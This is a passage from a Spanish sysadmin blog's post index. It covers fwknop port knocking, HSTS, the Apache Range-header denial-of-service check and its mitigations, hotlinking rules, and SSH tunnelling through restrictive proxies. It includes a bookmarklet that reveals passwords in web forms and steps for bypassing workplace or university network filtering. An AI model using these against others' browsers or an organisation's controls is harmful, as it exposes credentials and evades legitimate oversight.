clave (cliente) al servidor, para poder firmarla después con la del servidor. bash $ scp fwknop-client.asc remotehost:~ fwknop con claves GPG Estando en el servidor, y habiendo copiado la clave desde el cliente, la importamos. Una vez más, nos pedirá la contraseña: ```bash gpg --import fwknop-client.asc gpg: clave 723B172D: clave pública \"Client \" importada gpg: Cantidad total procesada: 1 gpg: importadas: 1 (RSA: 1) ``` Firmamos la clave del cliente con la del servidor: ```bash gpg --sign-key client@localhost pub 2048R/723B172D creado: 2011-09-17 [caduca: 2012-09-16] uso: SC confianza: desconocido validez: desconocido sub 2048R/3482560E creado: 2011-09-17 [caduca: 2012-09-16] uso: E desconocido (1). Client pub 2048R/723B172D creado: 2011-09-17 [caduca: 2012-09-16] uso: SC confianza: desconocido validez: desconocido Huella de clave primaria: 7EB6 CFC6 6617 6354 A2A1 2BBF FD15 D606 723B 172D Client Esta clave expirará el 2012-09-16. ¿Está realmente seguro de querer firmar esta clave con su clave: \"Server \" (4A064F2A)? ¿Firmar de verdad? (s/N) s Necesita una frase contraseña para desbloquear la clave secreta del usuario: \"Server \" clave RSA de 2048 bits, ID 4A064F2A, creada el 2011-09-17 ``` gpg: el agente gpg no esta disponible en esta sesión El agente gpg es un programa que se encarga de gestionar un almacén temporal de claves seguro. Sirve para no tener que introducir la frase de paso para la clave privada cada vez que la queramos utilizar en la misma sesión. Si no queremos que nos vuelva a salir ese aviso, o si no lo vamos a usar, podemos desinstalarlo: bash $ sudo aptitude purge gnupg-agent Ahora sólo queda modificar la configuración de acceso en el fichero /etc/fwknop/access.conf : ```bash SOURCE: ANY; OPEN_PORTS: tcp/22; DATA_COLLECT_MODE: PCAP; si no queremos utilizar cifrado simétrico, comentamos la siguiente línea KEY: myPassword GPG_HOME_DIR: /root/.gnupg; GPG_DECRYPT_ID: 4A064F2A; GPG_DECRYPT_PW: password para la clave; GPG_REMOTE_ID: 723B172D; FW_ACCESS_TIMEOUT: 30; ``` Y reiniciamos el servicio: bash $ sudo service fwknop-service restart Otra vez al cliente Instalamos fwknop-client en el cliente: bash $ sudo aptitude install fwknop-client Ya podemos probar a conectarnos. Primero, probamos la conexión por cifrado simétrico: ```bash $ fwknop -A 'tcp/22' -s -D 192.168.0.30 [+] Starting fwknop client (SPA mode)... [+] Enter an encryption key. This key must match a key in the file /etc/fwknop/access.conf on the remote system. Encryption Key: [+] Building encrypted Single Packet Authorization (SPA) message... [+] Packet fields: Random data: 8324045518684247 Username: karpoke Timestamp: 1316296897 Version: 1.9.12 Type: 1 (access mode) Access: 0.0.0.0,tcp/22 SHA256 digest: Lk3XUmw7PUd3OEOAb7mzb1kB+0CTTNzDyMrNdYK0YVo [+] Sending 182 byte message to 192.168.0.30 over udp/62201... ``` En el servidor, en los ficheros de log, por ejemplo en /var/log/messages , veremos algo como: bash Sep 18 00:01:37 server fwknopd: received valid Rijndael encrypted packet from: 192.168.0.100, remote user: karpoke, client version: 1.9.12 (SOURCE line num: 26) Sep 18 00:01:37 server fwknopd: add FWKNOP_INPUT 192.168.0.100 -> 0.0.0.0/0(tcp/22) ACCEPT rule 30 sec Sep 18 00:02:08 server fwknop(knoptm): removed iptables FWKNOP_INPUT ACCEPT rule for 192.168.0.100 -> 0.0.0.0/0(tcp/22), 30 sec timeout exceeded Si queremos utilizar la autenticación mediante la clave GPG: bash $ fwknop -A 'tcp/22' -s -D 192.168.0.30 --gpg-recip 4A064F2A --gpg-sign 723B172D Para conectarnos desde fuera de la red, debemos utilizar el argumento -w . Con este flag, el comando realiza una petición a whatismyip.com y utiliza esa IP. De lo contrario, estaríamos enviado nuestra IP interna y sería esa IP la que se utilizaría para crear la regla en el cortafuegos del servidor: bash $ fwknop -A 'tcp/22' -s -w -D 192.168.0.30 --gpg-recip 4A064F2A --gpg-sign 723B172D O podemos enviar la IP mediante el argumento -a : bash $ fwknop -A 'tcp/22' -s -a 1.2.3.4 -D 192.168.0.30 --gpg-recip 4A064F2A --gpg-sign 723B172D El cortafuegos Después de 30 segundos se elimina la regla que permite la conexión con el puerto. Si sucede que la conexión se corta cuando fwknop elimina la regla, podemos añadir una nueva regla que mantenga las conexiones que ya estuvieran establecidas: bash $ sudo iptables -A INPUT -p tcp -i eth0 -m state --state ESTABLISHED, RELATED -j ACCEPT Más información fwknop » Single Packet Authorization » Single Packet Authorization in Ubuntu » GPG Howto » fwknopping your way to success with single packet authorisation » SPA, Single Packet Authorization » Port knocking , ofuscación o capa de seguridad?","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/09/18/fwknop-single-packet-authorization-y-port-knocking/","loc":"https://karpoke.ignaciocano.com/2011/09/18/fwknop-single-packet-authorization-y-port-knocking/"},{"title":"Obtener la contraseña a partir de los asteriscos de un formulario web","text":"Si nos encontramos un formulario web lleno de asteriscos, podemos obtener lo que hay realmente escrito pegando lo siguiente en la barra de direcciones: javascript javascript:(function(){var s,F,j,f,i; s = \"\"; F = document.forms; for(j=0; j < f.length; ++j) { f = F[j]; for (i=0; i < f.length; ++i) { if (f[i].type.toLowerCase() == \"password\") s += f[i].value + \" \"; } } if (s) alert(\"Passwords in forms on this page: \" + s); else alert(\"There are no passwords in forms on this page.\");})();","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/09/11/obtener-la-contrasena-a-partir-de-los-asteriscos-de-un-formulario-web/","loc":"https://karpoke.ignaciocano.com/2011/09/11/obtener-la-contrasena-a-partir-de-los-asteriscos-de-un-formulario-web/"},{"title":"HTTP Strict Transport Security","text":"HTTP Strict Transport Security (HSTS) es un mecanismo de seguridad web donde el servidor exige que las conexiones se realicen únicamente mediante conexiones seguras. El servidor informa de esta política de seguridad utilizando la cabecera Strict-Transport-Security , en donde se especifica el periodo durante el cual las conexiones seguras son obligatorias. Si una web proporciona acceso seguro (HTTPS) pero accedemos de forma no segura (HTTP) podría suceder que nos redirija a la versión segura , sin embargo, ya se había iniciado una conversación sin cifrar. Este comportamiento puede ser explotado por un ataque Man-In-The-Middle . La política de seguridad HSTS pretende evitar este tipo de ataques, impidiendo que se realice ninguna conexión que no sea segura. La cabecera no se envía durante una transacción HTTP no cifrada dado que el User-Agent no sabe si HTTPS está disponible y porque podría haber sido inyectada por un atacante. Configuración en Apache En Apache, además de tener habilitado mod_headers , deberemos introducir la siguiente línea allí donde configuramos la conexión SSL . Por ejemplo, tras el DocumentRoot del VirtualHost seguro por defecto en el archivo /etc/apache2/sites-enabled/default-ssl : bash Header add Strict-Transport-Security \"max-age=15768000\" El atributo max-age especifica el tiempo durante el cual las conexiones seguras serán obligatorias. También se puede añadir el atributo includeSubDomains para incluir todos los subdominios: bash Header add Strict-Transport-Security \"max-age=15768000; includeSubDomains\" WordPress, por ejemplo, tiene una directiva para conseguir que la conexión al panel de control se haga a través de una conexión segura . Pero es posible que en otros casos sigamos necesitando una redirección hacia la versión segura de la página, que podemos conseguir mediante mod_rewrite : bash <IfModule mod_rewrite.c> RewriteEngine On RewriteCond %{HTTPS} off RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} </IfModule>","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/09/11/http-strict-transport-security/","loc":"https://karpoke.ignaciocano.com/2011/09/11/http-strict-transport-security/"},{"title":"Denegación de servicio en Apache utilizando la cabecera Range","text":"Una vulnerabilidad descubierta por kingcope permite que los servidores Apache vulnerables sean susceptibles de sufrir una denegación de servicio. La vulnerabilidad se encuentra en el uso de la cabecera Range . Esta cabecera se utiliza para obtener sólo una parte de la página. Si se solicitan varias partes además de pedir que la respuesta se comprima, mediante la cabecera Accept-Encoding: gzip , se dispara el consumo de procesador y memoria. Existe un script que permite comprobar si el servidor es vulnerable y, si es el caso, explotar dicha vulnerabilidad. Para comprobar si un servidor es vulnerable, podemos ejecutar: bash $ telnet 127.0.0.1 80 HEAD / HTTP/1.1 Host: 127.0.0.1 Range: bytes=0-5 Accept-Encoding: gzip Connection: close Si la respuesta es un código 206 Partial Content el servidor es vulnerable: bash HTTP/1.1 206 Partial Content Date: Wed, 31 Aug 2011 11:52:13 GMT Server: Apache/2.2.17 (Ubuntu) Vary: Accept-Encoding Content-Encoding: gzip Content-Range: bytes 0-5/20 Content-Length: 6 Connection: close Content-Type: text/html;charset=UTF-8 Protección Si tenemos un servidor vulnerable, podemos adoptar alguna de las siguientes medidas de protección. Podemos deshabilitar la cabecera Range mediante la directiva RequestHeader , usando el módulo mod_headers : bash RequestHeader unset Range » Limitar el número de intervalos mediante mod_rewrite : ```bash RewriteEngine On RewriteCond %{HTTP:Range} ([0-9]_-[0-9]_)(\\s*,\\s*[0-9]_-[0-9]_)+ RewriteRule .* - [NS,L,F] ``` » Deshabilitar el módulo mod_deflate : ```bash $ sudo a2dismod deflate ```","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/08/31/denegacion-de-servicio-en-apache-utilizando-la-cabecera-range/","loc":"https://karpoke.ignaciocano.com/2011/08/31/denegacion-de-servicio-en-apache-utilizando-la-cabecera-range/"},{"title":"Últimos paquetes instalados","text":"En el fichero /var/log/dpkg.log se registran las operaciones sobre los paquetes que tenemos en el sistema: instalaciones, actualizaciones, eliminaciones, etc. Para obtener una lista de los últimos paquetes instalados ejecutamos: bash $ cat /var/log/dpkg.log* | grep \" install \" | sort ... 2011-08-24 12:11:04 install linux-image-2.6.38-11-generic-pae < ninguna> 2.6.38-11.48 2011-08-24 12:11:27 install linux-headers-2.6.38-11 < ninguna> 2.6.38-11.48 2011-08-24 12:11:33 install linux-headers-2.6.38-11-generic-pae < ninguna> 2.6.38-11.48 2011-08-26 18:25:40 install libcgal5 < ninguna> 3.6.1-2ubuntu2 2011-08-26 18:25:41 install libopencsg1 < ninguna> 1.3.1-4 2011-08-26 18:25:42 install openscad < ninguna> 2011.06-1+natty1","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/27/ultimos-paquetes-instalados/","loc":"https://karpoke.ignaciocano.com/2011/08/27/ultimos-paquetes-instalados/"},{"title":"Evitando el hotlinking","text":"Si tenemos una página web que contiene imágenes, tarde o temprano, alguien terminará mostrándolas en otro sitio, enlazándolas directamente y utilizando nuestro ancho de banda. Vamos, lo que se conoce como hotlinking . La siguiente técnica se basa en el valor de la variable HTTP_REFERER , la cual es opcional, por lo que podría ser posible saltársela. Sin embargo, la mayoría de las veces impedirá el hotlinking . Como contrapartida, si alguien pone un enlace a una imagen, un usuario no podrá verla pulsando en el enlace, ya que el navegador incluirá como referer una URL externa y será bloqueada por el sistema. Con mod_rewrite Utilizando mod_rewrite tenemos varias opciones, desde denegar la petición hasta cambiar la imagen por otra. Las directivas RewriteCond y RewriteRule se pueden utilizar en el contexto de configuración del servidor, VirtualHost , Directory y .htaccess . Deberemos tener instalado el módulo mod_rewrite, tenerlo activado—mediante la directiva RewriteEngine On —y reiniciar el servicio para que los cambios tengan efecto. Denegar las peticiones: bash RewriteCond %{HTTP_REFERER} !&#94;$ RewriteCond %{HTTP_REFERER} !www.example.com [NC] RewriteRule \\.(gif|jpe?g|png)$ - [F,NC] Mostrar una imagen alternativa: bash RewriteCond %{HTTP_REFERER} !&#94;$ RewriteCond %{HTTP_REFERER} !www.example.com [NC] RewriteRule \\.(gif|jpe?g|png)$ /images/go-away.png [R,NC] Redirigir la petición a una imagen de otro sitio: bash RewriteCond %{HTTP_REFERER} !&#94;$ RewriteCond %{HTTP_REFERER} !www.example.com [NC] RewriteRule \\.(gif|jpe?g|png)$ http://other.example.com/image.gif [R,NC] Si queremos prevenir el hotlinking de otro tipo de ficheros , como por ejemplo vídeos o ficheros de texto, tenemos que cambiar la directiva RewriteRule para incluirlos: bash RewriteRule \\.(gif|jpe?g|png|bmp|mov|avi|wmv|mpe?g)$ - [F] Si queremos que sí se pueda permitir un hotlinkg desde determinados sitios , sólo tenemos que añadirnos con la directiva RewriteCond : bash RewriteCond %{HTTP_REFERER} !friendlysite\\.com [NC] ... rest of RewriteCond's RewriteCond %{HTTP_REFERER} !google\\. [NC] RewriteCond %{HTTP_REFERER} !search\\?q=cache [NC] Por último, podemos redirigir estas peticiones a través de un fichero . Esta redirección se hace de forma transparente, sin que se muestre la ruta real que incluye el fichero. Con esta técnica evitamos que, si ponen un enlace a una imagen, luego no se pueda ver si alguien pulsa. Para poder pasarle la imagen como parámetro al script , deberemos cambiar la forma en que identificamos las imágenes: bash RewriteCond %{REQUEST_FILENAME} .*jpe?g$|.*gif$|.*png$ [NC] RewriteRule (.*) /showpic.php?pic=$1 Este fichero muestra una pequeña página web que contiene, además de la imagen, un enlace a nuestro sitio: php <?php // File: showpic.php // Author: A List Apart // Web: http://www.alistapart.com/articles/hotlinking/ header(\"Content-type: text/html\"); header(\"Expires: Mon, 26 Jul 1997 05:00:00 GMT\"); header(\"Cache-Control: no-store, no-cache, must-revalidate\"); header(\"Cache-Control: post-check=0, pre-check=0\", false); header(\"Pragma: no-cache\"); $pic = strip_tags( $_GET['pic'] ); if ( ! $pic ) { die(\"No picture specified.\"); } ?> <html> <head> <title><?php echo($pic); ?></title> <meta http-equiv=\"Content-Type\" encoding=\"charset=iso-8859-1\"> </head> <body> <img src=\"/<?php echo($pic); ?>\" alt=\"Image\"> Image from your web site. </body> </html> Sin mod_rewrite Si, simplemente, queremos denegar la petición, no es necesario utilizar mod_rewrite : ```bash SetEnvIf Referer example.com localreferer Order deny,allow Deny from all Allow from env=localreferer ``` Podemos probar si la solución funciona como queremos en el siguiente hotlink tester .","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/16/evitando-el-hotlinking/","loc":"https://karpoke.ignaciocano.com/2011/08/16/evitando-el-hotlinking/"},{"title":"SSH over HTTP-Proxy","text":"A veces, queremos poder navegar o chatear por Internet pero no queremos que nadie pueda conocer, ni bloquear, las páginas que visitamos o espiar nuestras conversaciones, bien porque porque estamos en el trabajo, la universidad o en una red abierta. En la red a la que estamos conectados puede que utilicen un proxy para controlar y bloquear servicios. Este bloqueo podría ser por puerto o por protocolo . Es posible que bloqueen algunas URLs, o IPs, pero seguramente tenemos acceso a la web, es decir, los puertos 80 y 443. Crearemos un túnel seguro para poder navegar seguros y evitar estas restricciones. Eso sí, puede que aparezca en algún log que nos hemos conectado a nuestra máquina remota. Proxy SOCKS Una manera de montar un túnel seguro es mediante un [ proxy SOCKS][proxy SOCKS]. Aprovechamos el hecho de que el puerto 443 no está bloqueado. En nuestro servidor remoto, podemos configurar openssh para que escuche en el puerto 443, añadiendo un Listen 443 al fichero /etc/ssh/sshd_config . Pero si ya tenemos un servidor web, por ejemplo apache2 , que sirve conexiones seguras , podemos hacer uso de sslh , que permite que ambos servicios, SSL y SSH, compartan el puerto 443 . En nuestra máquina, lo primero que haremos será configurar ssh para que pueda pasar a través del proxy maligno que nos obligan a usar, mediante corkscrew -está en los repositorios-. Editamos el fichero ~/.ssh/config , y añadimos: bash ProxyCommand /usr/local/bin/corkscrew proxy.evil.com 80 %h %p En lugar de corkscrew , podríamos utilizar proxytunnel : bash ProxyCommand proxytunnel -v -p proxy.evil.com:80 -r remotehost:443 -d %h:%p -H \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\\n\" Ahora ya podemos crear el proxy SOCKS desde nuestra máquina local: bash $ ssh -f -N -D 1080 user@remotehost Si no estamos obligados a utilizar un proxy , no hace falta que editemos el fichero ~/.ssh/config , y el proxy SOCKS se crea ejecutando el mismo comando que acabamos de lanzar. Sólo queda configurar alguna aplicación, por ejemplo Firefox. Vamos al Menú Editar > Preferencias > Avanzado > Red > Configuración de la conexión > Configuración manual del proxy y ponemos: bash Servidor SOCKS: localhost Puerto: 1080 Y listos. SSH over HTTP-Proxy Otra manera de hacerlo es a través de un proxy HTTP. En nuestra máquina remota, vamos a configurar Apache para que haga de proxy HTTP. Activamos el módulo: bash $ sudo a2enmod proxy_http Podemos realizar la configuración a nivel de módulo o de VirtualHost. Tener un proxy HTTP que redirija peticiones, mediante la directiva ProxyRequests , puede ser un peligro , dado que, mal configurado, podría permitir que cualquiera accediera a través de nosotros ocultando su identidad. Utilizar un proxy inverso, mediante la directiva ProxyPass y la directiva ProxyRequests Off , es menos crítico, porque los clientes sólo pueden conectar a los sitios que hemos configurado específicamente. Limitaremos el acceso para sólo permitirlo desde la propia máquina o desde una conexión SSH. Editamos el fichero /etc/apache2/mods-enabled/proxy.conf : ```bash Listen 889 ProxyRequests On AllowCONNECT 22 ProxyVia On Order deny,allow Deny from all Allow from 127.0.0.1 ``` Por un lado, el proxy no está escucha en el puerto por defecto, el 8080, sino que lo hace en el 889. Además, este puerto no está abierto ni el firewall ni en el router. El motivo de este cambio de puerto es que en la máquina remota tenía instalado Varnish, que es un acelerador web, que puede ser utilizado tanto para cachear contenido estático, como para balancear la carga o para incrementar la seguridad de nuestro servidor web . Sin embargo, en este caso, esto no supondrá ningún problema. Por otro, permitimos el método CONNECT al puerto 22, donde corre SSH, y permitimos el acceso únicamente desde la propia máquina. Una vez hechos los cambios, no olvidemos reiniciar el servidor web. Ahora ya podemos crear el túnel desde nuestra máquina; redirigiremos el puerto remoto 889 a nuestro puerto local 8080, realizando la conexión por SSH en el puerto remoto 443: bash $ ssh -L 8080:localhost:889 user@server.at.home -p 443 Igual que en el caso anterior, si tenemos que utilizar de forma obligatoria el proxy maligno, editamos el fichero ~/.ssh/config : bash ProxyCommand /usr/local/bin/corkscrew proxy.evil.com 80 %h %p Para configurar Firefox, vamos al Menú Editar > Preferencias > Avanzado > Red > Configuración de la conexión > Configuración manual del proxy y ponemos: bash HTTP Proxy: localhost (Usar este servidor proxy para todos los protocolos) Puerto: 8080 Si queremos configurar que se use el proxy desde el terminal, en aquellos programas que utilizan la variable de entorno HTTP_PROXY : bash $ export HTTP_PROXY='http://localhost:8080/' Y para quitarlo: bash $ export HTTP_PROXY='' Tanto desde Firefox como desde el terminal, podríamos haber puesto la IP, o el nombre, de un equipo remoto que tenga abierto un proxy HTTP. Sin utilizar el método CONNECT Si no podemos utilizar el método CONNECT para conectarnos al puerto 443 de nuestra máquina remota, podemos probar a cambiar de puerto, por si hubiera alguno permitido. Si no encontramos ninguno, todavía podemos establecer un túnel utilizando HTTP mediante httptunnel -también está en los repositorios-. Consta de dos programas, un cliente y un servidor. En nuestra máquina remota, ejecutamos el servidor, redirigiendo el puerto 80 al 22. En este caso, si ya teníamos instalado Varnish, deberemos utilizar otro puerto, y abrirlo en el firewall. bash $ hts -F localhost:22 80 En nuestra máquina local ejecutaremos el cliente, que redirige el puerto local 8080 al puerto remoto 80, que a su vez es redirigido al puerto 22 remoto, utilizando el proxy maligno obligatorio de la red a la que nos conectamos: bash $ htc -P proxy.evil.com:80 -F 8080 remotehost:80 Referencias » SSH Through or Over Proxy » Accessing Trillian Pro Remotely and Through an Encrypted Tunnel » Using Corkscrew to tunnel SSH over HTTP » Tunneling SSH over HTTP(S) » Bypass Any Firewall » SSHThroughHTTPProxy » Tunneling SSH over an HTTP-Proxy Server » Apache Module mod_proxy","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/15/ssh-over-http-proxy/","loc":"https://karpoke.ignaciocano.com/2011/08/15/ssh-over-http-proxy/"},{"title":"Obteniendo la IP pública, la IP privada y la dirección MAC en Bash","text":"En los scripts que escribimos, a menudo, es necesario conocer la IP pública de nuestra red, o la IP privada y la dirección MAC de una interfaz de red. Con el comando ifconfig podemos conocer la información de las interfaces de red: ```bash $ ifconfig eth0 Link encap:Ethernet direcciónHW 00:11:22:33:44:55 Direc. inet:192.168.0.30 Difus.:192.168.0.255 Másc:255.255.255.0 Dirección inet6: fe80::203:dff:fe3c:f419/64 Alcance:Enlace ACTIVO DIFUSI–N FUNCIONANDO MULTICAST MTU:1500 Métrica:1 Paquetes RX:1627 errores:0 perdidos:0 overruns:0 frame:0 Paquetes TX:1067 errores:0 perdidos:0 overruns:0 carrier:0 colisiones:0 long.colaTX:1000 Bytes RX:560137 (560.1 KB) TX bytes:235094 (235.0 KB) Interrupción:19 Dirección base: 0xc800 eth1 Link encap:Ethernet direcciónHW 00:11:22:33:44:66 DIFUSI–N MULTICAST MTU:1500 Métrica:1 Paquetes RX:0 errores:0 perdidos:0 overruns:0 frame:0 Paquetes TX:0 errores:0 perdidos:0 overruns:0 carrier:0 colisiones:0 long.colaTX:1000 Bytes RX:0 (0.0 B) TX bytes:0 (0.0 B) Interrupción:21 Dirección base: 0x8000 Memoria:ffcfe000-ffcfefff lo Link encap:Bucle local Direc. inet:127.0.0.1 Másc:255.0.0.0 Dirección inet6: ::1/128 Alcance:Anfitrión ACTIVO BUCLE FUNCIONANDO MTU:16436 Métrica:1 Paquetes RX:3299 errores:0 perdidos:0 overruns:0 frame:0 Paquetes TX:3299 errores:0 perdidos:0 overruns:0 carrier:0 colisiones:0 long.colaTX:0 Bytes RX:355696 (355.6 KB) TX bytes:355696 (355.6 KB) ``` Sin embargo, si queremos utilizar el dato en concreto—la IP privada o la dirección MAC—, necesitaremos trabajar un poco la salida que muestra ifconfig . IP privada Para obtener la IP privada (IPv4) de una interfaz concreta, por ejemplo, la eth0: bash $ ifconfig eth2 | perl -nle'/((\\d+\\.){3}\\d+)/ && print $1' 192.168.0.30 La expresión regular es suficiente para parsear la salida de ifconfig y obtener la dirección IP de la interfaz. Pero esta expresión regular no la podríamos emplear para descartar una IP privada no válida. El rango de IP privadas está definido en el RFC 1918 y contempla los rangos: bash 10.0.0.0 - 10.255.255.255 (10/8 prefix) 172.16.0.0 - 172.31.255.255 (172.16/12 prefix) 192.168.0.0 - 192.168.255.255 (192.168/16 prefix) Actualizado el 29 de diciembre de 2014 Podemos utilizar el comando ipcalc para ver los rangos privados: ```bash $ ipcalc 10.0.0.0/8 Address: 10.0.0.0 00001010. 00000000.00000000.00000000 Netmask: 255.0.0.0 = 8 11111111. 00000000.00000000.00000000 Wildcard: 0.255.255.255 00000000. 11111111.11111111.11111111 => Network: 10.0.0.0/8 00001010. 00000000.00000000.00000000 HostMin: 10.0.0.1 00001010. 00000000.00000000.00000001 HostMax: 10.255.255.254 00001010. 11111111.11111111.11111110 Broadcast: 10.255.255.255 00001010. 11111111.11111111.11111111 Hosts/Net: 16777214 Class A, Private Internet $ ipcalc 172.16.0.0/12 Address: 172.16.0.0 10101100.0001 0000.00000000.00000000 Netmask: 255.240.0.0 = 12 11111111.1111 0000.00000000.00000000 Wildcard: 0.15.255.255 00000000.0000 1111.11111111.11111111 => Network: 172.16.0.0/12 10101100.0001 0000.00000000.00000000 HostMin: 172.16.0.1 10101100.0001 0000.00000000.00000001 HostMax: 172.31.255.254 10101100.0001 1111.11111111.11111110 Broadcast: 172.31.255.255 10101100.0001 1111.11111111.11111111 Hosts/Net: 1048574 Class B, Private Internet $ ipcalc 192.168.0.0/16 Address: 192.168.0.0 11000000.10101000. 00000000.00000000 Netmask: 255.255.0.0 = 16 11111111.11111111. 00000000.00000000 Wildcard: 0.0.255.255 00000000.00000000. 11111111.11111111 => Network: 192.168.0.0/16 11000000.10101000. 00000000.00000000 HostMin: 192.168.0.1 11000000.10101000. 00000000.00000001 HostMax: 192.168.255.254 11000000.10101000. 11111111.11111110 Broadcast: 192.168.255.255 11000000.10101000. 11111111.11111111 Hosts/Net: 65534 Class C, Private Internet ``` El siguiente script realiza la comprobación de una IP privada , y devuelve 1 si es válida, o 0 en caso contrario: ```bash !/bin/bash IP=\"$1\" checks for a valid number: 0..255 function v() { n=${1:-300} if [ $n -lt 0 ] || [ $n -gt 255 ]; then echo 0 else echo 1 fi } parse IP OLD_IFS= \\(IFS IFS='.' IP=(\\) IP) IFS=$OLD_IFS A= \\({IP[0]} B=\\) {IP[1]} C= \\({IP[2]} D=\\) {IP[3]} private ips. rfc 1918 https://tools.ietf.org/html/rfc1918#page-4 10.0.0.0 to 10.255.255.255 172.16.0.0 to 172.31.255.255 192.168.0.0 to 192.168.255.255 if [ $A -eq 10 -a $(v $B) -eq 1 -a $(v $C) -eq 1 -a $(v $D) -eq 1 ] || [ $A -eq 172 -a $B -ge 16 -a $B -le 31 -a $(v $C) -eq 1 -a $(v $D) -eq 1 ] || [ $A -eq 192 -a $B -eq 168 -a $(v $C) -eq 1 -a $(v $D) -eq 1 ]; then echo 1 else echo 0 fi ``` Actualizado el 11 de enero de 2014 Otra forma de obtener la IP privada es mediante el comando hostname : bash $ hostname -I 192.168.0.30 Dirección MAC Para obtener la dirección MAC : bash $ ifconfig eth0 | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' 00:11:22:33:44:55 La dirección MAC está compuesta por 6 bytes, separados por dos puntos (:) o guión (-), por ejemplo, 00:11:22:33:44:55. La primera mitad (00:11:22) es el Identificador Único de Organización (OUI), el fabricante. La segunda mitad (33:44:55) es una extensión que permite identificar de forma única cada tarjeta de red para un fabricante concreto. Hay puntos de acceso que ignorarán OUIs inválidos. Está bien saber esto si vamos a cambiar la dirección MAC de una tarjeta . En este enlace se encuentra el listado de OUIs válidos . Una dirección MAC válida que tiene el último bit del primer byte a 0 , se corresponde con una dirección unicast . Si es 1, indica una dirección de grupo, lo que se suele reservar para tráfico multicast . Las direcciones MAC con un origen multicast son invalidas y se ignoran. Si generamos la dirección MAC de forma aleatoria , deberíamos poner el primer byte a 0, para asegurarnos: bash $ echo $(cat /proc/interrupts | md5sum | sed -r 's/&#94;(.{10}).*$/00\\1/; s/([0-9a-f]{2})/\\1:/g; s/:$//;') 00:1f:7a:2e:ef:c7 Podemos comprobar si el OUI es válido ejecutando: bash $ mac=$(ifconfig eth0 | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}') $ oui=${mac:0:8} $ oui=${oui//:/-} $ test ! -r oui.txt && wget http://standards.ieee.org/develop/regauth/oui/oui.txt # 2.3 MB $ grep -i $oui oui.txt && echo \"Valid OUI\" || echo \"Not valid OUI\" IP Pública Si queremos obtener nuestra IP pública (IPv4), podemos recurrir a servicios como el de DynDNS: bash $ curl -s checkip.dyndns.org | grep -Eo \"[0-9\\.]+\" 1.2.3.4 Otros servicios: checkip.dyndns.org fmbip.com icanhazip.com ifconfig.me ip.appspot.com ipecho.net/plain ipinfo.io ip.u3mx.com myip.dnsomatic.com myip.opendns.com snar.co/ip/ whatismyip.org www.check-my-ip.net www.ipchicken.com Actualización a 11 de enero de 2014 Si no queremos depender de terceros y tenemos acceso a algún servidor web, el siguiente código PHP nos devolverá nuestra IP: php <?php echo $_SERVER['REMOTE_ADDR']; ?> Si en lugar de estar conectados en una LAN, estamos conectados directamente a Internet, en lugar de recurrir a servicios externos, podemos ejecutar: bash $ ifconfig | grep 'inet addr:' | grep -v '127.0.0.1' | cut -d: -f2 | awk '{print $1}' 1.2.3.4 Actualizado el 24 de agosto de 2012 Direcciones .arpa Las direcciones .arpa se utilizan para la resolución inversa de DNS. Así por ejemplo, la IP 1.2.3.4 se asocia al dominio 4.3.2.1.in-addr.arpa. Si queremos obtener las IP asociadas a dominios .arpa para utilizarlas, por ejemplo, en un script , podemos usar el siguiente alias : bash $ alias arpa2ip='(type farpa2ip >/dev/null 2>&1) || farpa2ip() { echo \"$1\" | awk '\\''BEGIN{FS=\".\"}{print $4\".\"$3\".\"$2\".\"$1;}'\\''; }; farpa2ip' Un ejemplo de uso: bash $ arpa2ip 12.108.52.65.in-addr.arpa 65.52.108.12 El proceso inverso, obtener una dirección .arpa a partir de una IP, se puede conseguir mediante el siguiente alias : bash $ alias ip2arpa='(type fip2arpa >/dev/null 2>&1) || fip2arpa() { echo \"$1\" | awk '\\''BEGIN{FS=\".\"}{print $4\".\"$3\".\"$2\".\"$1\".in-addr.arpa\";}'\\''; }; fip2arpa' Un ejemplo de uso: bash $ ip2arpa 65.52.108.12 12.108.52.65.in-addr.arpa if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + 